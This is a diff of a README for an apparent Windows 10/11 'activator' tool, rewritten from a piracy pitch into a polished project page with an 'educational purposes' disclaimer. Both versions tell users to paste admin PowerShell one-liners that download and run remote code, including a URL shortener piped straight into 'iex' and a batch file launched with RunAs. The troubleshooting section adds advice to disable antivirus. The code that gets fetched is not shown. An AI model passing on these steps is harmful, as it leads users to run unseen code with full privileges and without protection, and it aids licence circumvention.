@@ -1,56 +1,92 @@
-Easily activate Windows 10 and 11 with this simple, reliable tool. Achieve permanent activation with just a few straightforward steps, ensuring your system runs smoothly and efficiently.
+# Windows Activation Assistant
 
+A lightweight utility for Windows 10/11 activation management.
 
-Key Features:
+> ⚠️ **Disclaimer**: This tool is for educational and testing purposes only. Please ensure you have appropriate licensing for your Windows installation.
 
-Lifetime Activation: Permanently activate Windows 10 and 11.
+## 🌟 Features
 
-Simple Process: Minimal steps – just run the provided .bat file for instant activation.
+- **Automated Activation**: Streamlined process for Windows 10 and 11
+- **Multiple Methods**: Choose from PowerShell, manual batch, or script execution
+- **User-Friendly**: Simple interface with clear instructions
+- **Error Handling**: Built-in validation and error recovery
+- **Logging**: Detailed activity logging for troubleshooting
 
-Hassle-Free: No complex setup or technical knowledge required.
+## 📋 Prerequisites
 
-How to Use:
+- Windows 10 or Windows 11
+- Administrative privileges
+- Internet connection
+- PowerShell 5.1 or higher
 
-Method 1: Use PowerShell
+## 🚀 Installation Methods
 
-Open PowerShell (press Start and type "PowerShell").
+### 1. PowerShell One-Line Installation
 
-Copy and paste the following command into PowerShell, then press Enter:
+1. Press `Win + X` and select "Windows PowerShell (Admin)"
+2. Copy and paste one of the following commands:
 
-powershell
+```powershell
+# Full installation
+irm "https://raw.githubusercontent.com/gelogrammer/Windows-10-and-11-Activator/refs/heads/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs
 
-COPY AND PASTE THIS:
-
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-irm "https://raw.githubusercontent.com/betamod9/Windows-10-and-11-Activator/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs
-
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-OR SHORT CODE: 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Quick installation
 irm https://dub.sh/activator | iex
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Method 2: Manual Download
+```
 
-Download or copy the windows.bat file to your system.
+### 2. Manual Batch File Installation
 
-Double-click the windows.bat file to run it.
+1. Download `windows.bat` from the releases page
+2. Right-click the file and select "Run as administrator"
+3. Follow the on-screen prompts
 
-Follow the on-screen instructions to complete the activation.
+### 3. PowerShell Script Installation
 
-Enjoy a permanently activated Windows system in no time!
+1. Download `win.ps1` from the releases page
+2. Right-click the file and select "Run with PowerShell"
+3. Follow the on-screen prompts
 
-Method 3: Manual Download
+## 📝 Usage Instructions
 
-Download or copy the win.ps1 file to your system.
+1. Choose your preferred installation method
+2. Allow administrative privileges when prompted
+3. Wait for the activation process to complete
+4. Restart your system when prompted
 
-Right-click the win.ps1 file and pres Run with PowerShell to run it.
+## 🔍 Verification
 
-Follow the on-screen instructions to complete the activation.
+To verify activation status:
+1. Open Command Prompt as administrator
+2. Run `slmgr /xpr`
+3. Check the displayed activation status
 
-Enjoy a permanently activated Windows system in no time!
+## 📸 Screenshots
 
+![Activation Process](https://github.com/user-attachments/assets/ce853d71-7d34-409c-a809-1a64508c14f3)
+![Successful Activation](https://github.com/user-attachments/assets/b898383e-433d-412a-bb63-fa6ae9553155)
 
+## ⚠️ Troubleshooting
 
-![U233334ntitled](https://github.com/user-attachments/assets/ce853d71-7d34-409c-a809-1a64508c14f3)
-![121](https://github.com/user-attachments/assets/b898383e-433d-412a-bb63-fa6ae9553155)
+If you encounter issues:
+1. Ensure you have administrative privileges
+2. Check your internet connection
+3. Temporarily disable antivirus software
+4. Review the log file at `%TEMP%\system_management.log`
+
+## 📄 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## 🤝 Contributing
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+## 📞 Support
+
+- Create an issue in this repository
+- Review existing issues for solutions
+- Check the [FAQ](FAQ.md) section
+
+---
+
+⭐ If you find this tool helpful, please consider giving it a star!
